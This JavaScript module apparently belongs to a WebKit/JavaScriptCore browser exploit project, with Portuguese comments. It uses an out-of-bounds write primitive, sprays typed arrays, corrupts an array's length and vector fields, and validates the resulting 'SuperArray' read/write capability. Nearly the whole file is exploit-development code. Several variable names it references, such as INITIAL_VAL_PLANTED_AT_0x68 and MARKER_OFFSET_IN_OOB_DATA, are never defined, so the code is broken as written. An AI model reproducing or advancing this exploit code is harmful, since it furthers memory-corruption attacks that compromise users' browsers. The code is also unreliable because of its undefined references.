// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO, OOB_CONFIG } from '../config.mjs';

const FNAME_USER_LOG_REPLICATION = "userLogReplication_v28b";

// Constantes do seu Log.txt [00:51:23] (investigateControl_v7)
const OOB_OFFSET_0x68_MVECTOR_TARGET = 0x68;
const OOB_OFFSET_0x6C_MLENGTH_MMODE_TARGET = 0x6C; // Onde m_length e m_mode seriam lidos (0x70 e 0x74 relativos a 0x58)
const OOB_OFFSET_0x70_TRIGGER = 0x70;

// Valores INICIAIS a serem plantados no oob_buffer, conforme seu Log.txt
const INITIAL_VAL_FOR_0x68 = new AdvancedInt64(0x11223344, 0xAABBCCDD); // aabbccdd_11223344
const INITIAL_VAL_FOR_0x6C = new AdvancedInt64(0xFFFFFFFF, 0xEEEEFFFF); // eeeeffff_ffffffff

const TRIGGER_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Valores ESPERADOS no oob_buffer APÓS o trigger, conforme seu Log.txt
const EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER = new AdvancedInt64(0xAABBCCDD, 0x11223344); // 0x11223344_aabbccdd
const EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER = new AdvancedInt64(0x11223344, 0xFFFFFFFF); // 0xffffffff_11223344
const EXPECTED_OOB_LOW_DWORD_AT_0x70_AFTER_TRIGGER = 0xFFFFFFFF; // Para m_length

// Metadados esperados para o SuperArray (objeto JS corrompido)
const EXPECTED_SUPERARRAY_M_VECTOR = EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER;
const EXPECTED_SUPERARRAY_M_LENGTH = EXPECTED_OOB_LOW_DWORD_AT_0x70_AFTER_TRIGGER;

const NUM_SPRAY_OBJECTS = 500; // Ajuste conforme necessário
const ORIGINAL_SPRAY_LENGTH = 8;

const MARKER_TO_VALIDATE_SUPERARRAY_READ = 0xABCDDCBA;
const OFFSET_IN_TARGET_BUFFER_FOR_MARKER = 0x0; // Plantar no início da área alvo do superArray

let sprayedVictimObjects = [];

export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_USER_LOG_REPLICATION}: Replicar Log [00:51:23] e Validar SuperArray ---`, "test", FNAME_USER_LOG_REPLICATION);
    sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3("Ambiente OOB inicializado.", "info", FNAME_USER_LOG_REPLICATION);

        // FASE 1: Spray
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_USER_LOG_REPLICATION);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            u32arr[0] = 0xC0C0C0C0 ^ i;
            sprayedVictimObjects.push(u32arr);
        }
        logS3("Pulverização concluída.", "good", FNAME_USER_LOG_REPLICATION);

        // FASE 2: Plantar valores INICIAIS no oob_array_buffer_real
        logS3(`FASE 2: Plantando valores iniciais em oob_buffer (PRÉ-TRIGGER)...`, "info", FNAME_USER_LOG_REPLICATION);
        oob_write_absolute(OOB_OFFSET_0x68_MVECTOR_TARGET, INITIAL_VAL_PLANTED_AT_0x68, 8);
        oob_write_absolute(OOB_OFFSET_0x6C_MLENGTH_MMODE_TARGET, INITIAL_VAL_PLANTED_AT_0x6C, 8);

        logS3("  Valores NO OOB_BUFFER ANTES do trigger (após nosso plantio):", "info", FNAME_USER_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x68_MVECTOR_TARGET)}] = ${oob_read_absolute(OOB_OFFSET_0x68_MVECTOR_TARGET, 8).toString(true)}`, "info", FNAME_USER_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x6C_MLENGTH_MMODE_TARGET)}] = ${oob_read_absolute(OOB_OFFSET_0x6C_MLENGTH_MMODE_TARGET, 8).toString(true)}`, "info", FNAME_USER_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] (QWORD) = ${oob_read_absolute(OOB_OFFSET_0x70_TRIGGER, 8).toString(true)}`, "info", FNAME_USER_LOG_REPLICATION);

        // FASE 3: Trigger OOB principal
        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] com ${TRIGGER_VALUE.toString(true)}...`, "info", FNAME_USER_LOG_REPLICATION);
        oob_write_absolute(OOB_OFFSET_0x70_TRIGGER, TRIGGER_VALUE, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_USER_LOG_REPLICATION);
        
        const val_0x68_after = oob_read_absolute(OOB_OFFSET_0x68_MVECTOR_TARGET, 8); 
        const val_0x6C_after = oob_read_absolute(OOB_OFFSET_0x6C_MLENGTH_MMODE_TARGET, 8); 
        const val_0x70_qword_after = oob_read_absolute(OOB_OFFSET_0x70_TRIGGER, 8);
        
        logS3(`  Valores NO OOB_BUFFER APÓS trigger (para comparação com Log [00:51:23]):`, "info", FNAME_USER_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x68_MVECTOR_TARGET)}] = ${val_0x68_after.toString(true)} (Seu Log: ${EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER.toString(true)})`, "info", FNAME_USER_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x6C_MLENGTH_MMODE_TARGET)}] = ${val_0x6C_after.toString(true)} (Seu Log: ${EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER.toString(true)})`, "info", FNAME_USER_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] (QWORD) = ${val_0x70_qword_after.toString(true)} (Seu Log: 0xffffffff_ffffffff) => LOW_DWORD (m_length) = ${toHex(val_0x70_qword_after.low())}`, "info", FNAME_USER_LOG_REPLICATION);

        if (val_0x68_after.equals(EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER) && val_0x70_qword_after.low() === EXPECTED_SUPERARRAY_M_LENGTH) {
            logS3("    !!!! Dinâmica de bytes no oob_buffer APÓS trigger CORRESPONDE ao seu Log de Sucesso [00:51:23] para m_vector e m_length !!!!", "vuln", FNAME_USER_LOG_REPLICATION);
            document.title = "OOB DINÂMICA REPLICADA!";
        } else {
            logS3("    AVISO: Dinâmica de bytes no oob_buffer após trigger NÃO corresponde ao seu Log de Sucesso [00:51:23].", "warn", FNAME_USER_LOG_REPLICATION);
            document.title = "OOB Dinâmica DIFERENTE";
        }
        await PAUSE_S3(300);

        // FASE 4: Identificar SuperArray
        logS3(`FASE 4: Tentando identificar SuperArray (pelo length ${toHex(EXPECTED_SUPERARRAY_M_LENGTH)})...`, "info", FNAME_USER_LOG_REPLICATION);
        let superArray = null;
        let superArrayIndex = -1;

        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === EXPECTED_SUPERARRAY_M_LENGTH) {
                superArray = sprayedVictimObjects[i];
                superArrayIndex = i;
                logS3(`    !!!! SUPERARRAY (Uint32Array) ENCONTRADO !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_USER_LOG_REPLICATION);
                document.title = `SUPERARRAY Idx ${i}! Len OK!`;
                break; 
            }
        }

        if (superArray) {
            logS3(`  SuperArray obtido. Seu m_vector DEVERIA ser ${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)}.`, "info", FNAME_USER_LOG_REPLICATION);
            logS3(`  Validando se o SuperArray pode ler/escrever no oob_array_buffer_real...`, "info", FNAME_USER_LOG_REPLICATION);

            // Escrever marcador no oob_array_buffer_real via oob_write_absolute
            oob_write_absolute(MARKER_OFFSET_IN_OOB_DATA, MARKER_TO_VALIDATE_SUPERARRAY_READ, 4);
            logS3(`    Marcador ${toHex(MARKER_TO_VALIDATE_SUPERARRAY_READ)} escrito em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_DATA)}] (via oob_write).`, "info", FNAME_USER_LOG_REPLICATION);

            // Se o m_vector do superArray (EXPECTED_SUPERARRAY_M_VECTOR) é o dataPointer do oob_array_buffer_real,
            // então superArray[MARKER_OFFSET_IN_OOB_DATA / 4] deve ler o marcador.
            const index_to_read_marker_in_superarray = MARKER_OFFSET_IN_OOB_DATA / 4;
            
            try {
                // Antes de ler, vamos tentar escrever com o superArray para ter certeza que ele tem o R/W esperado
                const test_write_val_superarray = 0xBADDBADD;
                superArray[index_to_read_marker_in_superarray] = test_write_val_superarray;
                logS3(`    SuperArray[${toHex(index_to_read_marker_in_superarray)}] tentou escrever ${toHex(test_write_val_superarray)}.`, "info", FNAME_USER_LOG_REPLICATION);

                // Ler de volta com oob_read_absolute para ver se a escrita do superArray funcionou no oob_buffer
                const val_in_oob_after_superarray_write = oob_read_absolute(MARKER_OFFSET_IN_OOB_DATA, 4);
                logS3(`    Valor em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_DATA)}] após escrita do SuperArray (lido via oob_read): ${toHex(val_in_oob_after_superarray_write)}`, "info", FNAME_USER_LOG_REPLICATION);

                if (val_in_oob_after_superarray_write === test_write_val_superarray) {
                    logS3(`      !!!! SUCESSO !!!! SuperArray com m_vector=${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)} PODE ESCREVER no oob_array_buffer_real!`, "vuln", FNAME_USER_LOG_REPLICATION);
                    document.title = "SUPERARRAY R/W FUNCIONAL!";
                    // Restaurar marcador original
                    oob_write_absolute(MARKER_OFFSET_IN_OOB_DATA, MARKER_TO_VALIDATE_SUPERARRAY_READ, 4);
                } else {
                    logS3(`      Falha na escrita do SuperArray no oob_buffer. Marcador não corresponde.`, "error", FNAME_USER_LOG_REPLICATION);
                    document.title = "SuperArray Escrita Falhou";
                }
            } catch (e) {
                 logS3(`    Erro ao tentar usar SuperArray para escrever/ler marcador: ${e.message}`, "error", FNAME_USER_LOG_REPLICATION);
                 document.title = "SuperArray Erro R/W Marcador";
            }
        } else {
            logS3("  Nenhum SuperArray (Uint32Array com length corrompido) identificado.", "error", FNAME_USER_LOG_REPLICATION);
            document.title = "SuperArray NÃO Encontrado (v28b)";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_USER_LOG_REPLICATION}: ${e.message}`, "critical", FNAME_USER_LOG_REPLICATION);
        document.title = `${FNAME_USER_LOG_REPLICATION} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_USER_LOG_REPLICATION} Concluído ---`, "test", FNAME_USER_LOG_REPLICATION);
    }
}
